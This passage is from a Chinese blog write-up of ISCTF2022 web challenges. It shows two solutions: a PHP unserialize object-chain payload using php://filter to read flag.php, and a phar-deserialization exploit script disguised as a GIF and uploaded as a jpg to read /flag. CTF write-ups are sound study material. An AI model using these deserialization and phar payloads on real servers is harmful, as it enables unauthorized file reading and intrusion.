class="line"><span class="function">  </span>&#123; </span><br><span class="line">    <span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;I&#x27;m a vicious dog, Kitty&quot;</span>;    </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cat&quot;</span>]);   <span class="comment">//反序列化</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mouse</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;v = <span class="string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cat</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = &amp;<span class="variable language_">$this</span>-&gt;b;  <span class="comment">//&amp;引用</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="string">&quot;xxx&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c = <span class="keyword">new</span> <span class="title function_ invoke__">mouse</span>();   <span class="comment">//c-&gt;b-&gt;a   ，调用include函数</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">cat</span>());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/25610059/1667399452304-e6e6983c-0935-455b-8a62-e8e333da5b97.png#clientId=ua12befa2-0f06-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=65&id=udf2ae256&margin=%5Bobject%20Object%5D&name=image.png&originHeight=81&originWidth=1540&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10688&status=done&style=none&taskId=u898d53c5-6e59-466c-babf-c27950f37de&title=&width=1232" alt="image.png"><br><strong>?cat&#x3D;O:3:”cat”:3:{s:1:”a”;s:3:”xxx”;s:1:”b”;R:2;s:1:”c”;O:5:”mouse”:1:{s:1:”v”;s:52:”php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php”;}}</strong><br><img src="https://cdn.nlark.com/yuque/0/2022/png/25610059/1667399507735-2a111f07-b65d-4c5f-a7d1-cf83507ff117.png#clientId=ua12befa2-0f06-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=318&id=uc686390a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=398&originWidth=1620&originalType=binary&ratio=1&rotation=0&showTitle=false&size=53123&status=done&style=none&taskId=u6bfc8c2b-2db0-4bf8-af1d-f7236c8c8ef&title=&width=1296" alt="image.png"><br>base64解码</p>
<h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/25610059/1667860443310-161b4be5-b2c5-44f2-b72a-d3f224663343.png#clientId=u0b525e8c-7f72-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=576&id=u67247531&margin=%5Bobject%20Object%5D&name=image.png&originHeight=720&originWidth=589&originalType=binary&ratio=1&rotation=0&showTitle=false&size=43862&status=done&style=none&taskId=u158d3fb9-74e7-4480-974c-f0b44c90948&title=&width=471.2" alt="image.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">upload</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$size</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Valid_ext</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ext = <span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]));</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;size = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Valid_ext = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>, <span class="string">&quot;jpeg&quot;</span>, <span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">start</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;filename))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Image already exsists&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">elseif</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$this</span>-&gt;ext, <span class="variable">$this</span>-&gt;Valid_ext))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Only Image Can Be Uploaded&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">move</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">move</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;upload/&quot;</span>.<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Upload succsess!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">check_img</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$img_name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;img_name = <span class="variable">$_GET</span>[<span class="string">&#x27;img_name&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">img_check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;img_name))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Image exsists&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Image not exsists&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/25610059/1667860609661-1324549d-b24f-4b69-9bcd-4b9afbeb6e07.png#clientId=u0b525e8c-7f72-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=358&id=u2d164219&margin=%5Bobject%20Object%5D&name=image.png&originHeight=447&originWidth=934&originalType=binary&ratio=1&rotation=0&showTitle=false&size=30166&status=done&style=none&taskId=u7a7553bb-253f-4d67-927f-60dc65235c9&title=&width=747.2" alt="image.png"><br>这个是phar反序列化的触发函数<br>构造payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">upload</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$size</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Valid_ext</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">new</span> <span class="title function_ invoke__">upload</span>();</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;test.phar&quot;</span>);<span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);<span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$p</span>);<span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);<span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure>
<p>要被自己蠢死，没有运行脚本直接上传，能出flag才怪，好丢人啊啊啊😭<br>运行脚本后产生phar文件，改成jpg格式上传，然后访问，就能得到flag<br><img src="https://cdn.nlark.com/yuque/0/2022/png/25610059/1667883461792-a99e11c1-64d8-40ef-b2d7-01f6faf3c934.png#clientId=u7c664ebe-3fae-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=552&id=u6281efb1&margin=%5Bobject%20Object%5D&name=image.png&originHeight=690&originWidth=1383&originalType=binary&ratio=1&rotation=0&showTitle=false&size=56379&status=done&style=none&taskId=u480bf1e4-c104-4d84-99ec-f66ddd6662f&title=&width=1106.4" alt="image.png"><br>其中好多题都是大佬教给我做的，感谢，tql  !😍</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://www.chenyxy.ltd">By Chen</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://www.chenyxy.ltd/archives/37243.html">https://www.chenyxy.ltd/archives/37243.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://www.chenyxy.ltd" target="_blank">Chen</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/%E5%88%B7%E9%A2%98/">刷题</a><a class="post-meta__tags" href="/tags/WEB/">WEB</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.nlark.com/yuque/0/2022/png/25610059/1667780403471-660c42f3-0748-4739-9f22-e325d89e002a.png#clientId=uf7071d46-b4c1-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=710&amp;id=u7a046841&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=887&amp;originWidth=1028&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=22378&amp;status=done&amp;style=none&amp;taskId=u6579d803-459c-40bd-ba32-0cdf73640d5&amp;title=&amp;width=822.4" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-full"><a href="/archives/51925.html"><img class="prev-cover" src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220921140308740.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">服务器基本概念</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/archives/37777.html" title="Ctf Show web入门刷题记录"><img class="cover" src="/./img/fl.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-08-14</div><div class="title">Ctf Show web入门刷题记录</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="lv-container" data-id="city" data-uid="MTAyMC81NzAyNC8zMzQ4OA=="></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/./img/tx.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">By Chen</div><div class="author-info__description">欢迎来到我的博客~</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/chenyxy"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/chenyxy" rel="external nofollow noreferrer" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:2231497657@qq.com" rel="external nofollow noreferrer" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">Hello ~<img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/dtt.gif"></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#EASY-PHP01"><span class="toc-number">1.</span> <span class="toc-text">EASY-PHP01</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EASY-PHP02"><span class="toc-number">2.</span> <span class="toc-text">EASY-PHP02</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FakeWeb"><span class="toc-number">3.</span> <span class="toc-text">FakeWeb</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#simplephp"><span class="toc-number">4.</span> <span class="toc-text">simplephp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#curl"><span class="toc-number">5.</span> <span class="toc-text">curl</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#eazy-onlineshell"><span class="toc-number">6.</span> <span class="toc-text">eazy-onlineshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%82%BB%E6%9F%B1"><span class="toc-number">7.</span> <span class="toc-text">傻柱</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-upload"><span class="toc-number">8.</span> <span class="toc-text">easy_upload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rce%EF%BC%9F"><span class="toc-number">9.</span> <span class="toc-text">rce？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8C%AB%E5%92%8C%E8%80%81%E9%BC%A0"><span class="toc-number">10.</span> <span class="toc-text">猫和老鼠</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#upload"><span class="toc-number">11.</span> <span class="toc-text">upload</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/archives/37243.html" title="ISCTF2022  web  wp"><img src="https://cdn.nlark.com/yuque/0/2022/png/25610059/1667780403471-660c42f3-0748-4739-9f22-e325d89e002a.png#clientId=uf7071d46-b4c1-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=710&amp;id=u7a046841&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=887&amp;originWidth=1028&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=22378&amp;status=done&amp;style=none&amp;taskId=u6579d803-459c-40bd-ba32-0cdf73640d5&amp;title=&amp;width=822.4" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ISCTF2022  web  wp"/></a><div class="content"><a class="title" href="/archives/37243.html" title="ISCTF2022  web  wp">ISCTF2022  web  wp</a><time datetime="2022-11-08T05:05:21.822Z" title="发表于 2022-11-08 13:05:21">2022-11-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/archives/51925.html" title="服务器基本概念"><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220921140308740.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="服务器基本概念"/></a><div class="content"><a class="title" href="/archives/51925.html" title="服务器基本概念">服务器基本概念</a><time datetime="2022-09-21T06:20:07.000Z" title="发表于 2022-09-21 14:20:07">2022-09-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/archives/1.html" title="博客迁移node.js换路径npm安装及报错问题"><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220816134145133.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="博客迁移node.js换路径npm安装及报错问题"/></a><div class="content"><a class="title" href="/archives/1.html" title="博客迁移node.js换路径npm安装及报错问题">博客迁移node.js换路径npm安装及报错问题</a><time datetime="2022-08-16T10:54:28.933Z" title="发表于 2022-08-16 18:54:28">2022-08-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/archives/37777.html" title="Ctf Show web入门刷题记录"><img src="/./img/fl.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Ctf Show web入门刷题记录"/></a><div class="content"><a class="title" href="/archives/37777.html" title="Ctf Show web入门刷题记录">Ctf Show web入门刷题记录</a><time datetime="2022-08-14T14:55:07.259Z" title="发表于 2022-08-14 22:55:07">2022-08-14</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;undefined - 2022  <i id="heartbeat" class="fa fas fa-heartbeat"></i> By Chen</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">很高兴认识你🥰</div></div><head><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"></head></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script>function panguFn () {
  if (typeof pangu === 'object') pangu.autoSpacingPage()
  else {
    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
      .then(() => {
        pangu.autoSpacingPage()
      })
  }
}

function panguInit () {
  if (false){
    GLOBAL_CONFIG_SITE.isPost && panguFn()
  } else {
    panguFn()
  }
}

document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>(() => {
  const $mermaidWrap = document.querySelectorAll('#article-container .mermaid-wrap')
  if ($mermaidWrap.length) {
    window.runMermaid = () => {
      window.loadMermaid = true
      const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'

      Array.from($mermaidWrap).forEach((item, index) => {
        const mermaidSrc = item.firstElementChild
        const mermaidThemeConfig = '%%{init:{ \'theme\':\'' + theme + '\'}}%%\n'
        const mermaidID = 'mermaid-' + index
        const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
        mermaid.mermaidAPI.render(mermaidID, mermaidDefinition, (svgCode) => {
          mermaidSrc.insertAdjacentHTML('afterend', svgCode)
        })
      })
    }

    const loadMermaid = () => {
      window.loadMermaid ? runMermaid() : getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(runMermaid)
    }

    window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
  }
})()</script><script>function loadLivere () {
  if (typeof LivereTower === 'object') {
    window.LivereTower.init()
  }
  else {
    (function(d, s) {
        var j, e = d.getElementsByTagName(s)[0];
        if (typeof LivereTower === 'function') { return; }
        j = d.createElement(s);
        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
        j.async = true;
        e.parentNode.insertBefore(j, e);
    })(document, 'script');
  }
}

if ('Livere' === 'Livere' || !false) {
  if (false) btf.loadComment(document.getElementById('lv-container'), loadLivere)
  else loadLivere()
}
else {
  function loadOtherComment () {
    loadLivere()
  }
}</script></div><script src="https://cdn.jsdelivr.net/gh/lete114/CDN/Sum/title.js"></script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["meta[property=\"og:image\"]","meta[property=\"og:title\"]","meta[property=\"og:url\"]","head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {

  // removeEventListener scroll 
  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)

  typeof preloader === 'object' && preloader.initLoading()
  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')

  typeof disqusjs === 'object' && disqusjs.destroy()
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof chatBtnFn === 'function' && chatBtnFn()
  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()

  typeof preloader === 'object' && preloader.endLoading()
})

document.addEventListener('pjax:error', (e) => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>